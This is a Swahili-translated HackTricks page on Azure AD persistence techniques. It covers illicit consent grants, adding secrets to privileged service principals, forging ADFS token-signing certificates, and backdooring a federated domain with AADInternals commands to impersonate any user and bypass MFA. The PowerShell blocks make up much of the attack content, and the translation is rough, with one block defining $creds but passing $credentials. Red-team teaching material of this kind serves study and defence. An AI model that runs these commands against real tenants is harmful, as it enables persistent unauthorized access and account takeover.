# Az - Uthabiti

{% hint style="success" %}
Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya GCP (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Aunga mkono HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

### Kibali cha Siri Haramu

Kwa chaguo-msingi, mtumiaji yeyote anaweza kujiandikisha kwa programu katika Azure AD. Kwa hivyo unaweza kujiandikisha programu (kwa ajili ya mpangaji wa lengo) inayohitaji ruhusa kubwa ya athari na idhini ya msimamizi (na kuipitisha ikiwa wewe ni msimamizi) - kama kutuma barua pepe kwa niaba ya mtumiaji, usimamizi wa jukumu nk. Hii itaturuhusu **kutekeleza mashambulizi ya udukuzi** ambayo ingekuwa **yenye mafanikio** sana kwa kesi ya mafanikio.

Zaidi ya hayo, unaweza pia kukubali programu hiyo na mtumiaji wako kama njia ya kudumisha ufikiaji juu yake.

### Programu na Mabwana wa Huduma

Kwa mamlaka ya Msimamizi wa Programu, GA au jukumu la desturi lenye ruhusa za microsoft.directory/applications/credentials/update, tunaweza kuongeza siri (au cheti) kwa programu iliyopo.

Inawezekana **kulenga programu yenye ruhusa kubwa** au **kuongeza programu mpya** yenye ruhusa kubwa.

Jukumu la kuvutia la kuongeza kwa programu hiyo ni **Jukumu la Msimamizi wa Uthibitishaji wa Kipekee** kwani inaruhusu **kusahau nenosiri** la Wasimamizi wa Kijumla.

Mbinu hii pia inaruhusu **kupuuza MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Kwa uthibitisho kulingana na cheti
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Umoja - Cheti cha Kusainiwa kwa Tokeni

Kwa **madaraka ya DA** kwenye AD ya ndani, niwezekanavyo kuunda na kuagiza **vyeti vipya vya kusaini tokeni** na **vyeti vya kufyatua tokeni** ambavyo vina muda mrefu sana wa uhalali. Hii itatuwezesha **kuingia kama mtumiaji yeyote** ambaye tunajua ImuutableID yake.

**Endesha** amri ifuatayo kama **DA kwenye seva za ADFS** ili kuunda vyeti vipya (nywila ya chaguo ni 'AADInternals'), waongeze kwenye ADFS, zima ugeuzaji wa moja kwa moja na anzisha upya huduma:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Kisha, sasisha habari ya cheti na Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Umoja - Kikoa Kinachotegemewa

Ukiwa na mamlaka ya GA kwenye mpangaji, ni **kawaida kuongeza kikoa kipya** ( lazima ithibitishwe), weka aina yake ya uthibitishaji kuwa Umoja na weka kikoa hicho **kuamini cheti maalum** (any.sts katika amri hapa chini) na mtoaji:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Marejeo

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Jifunze na zoea Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoea Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
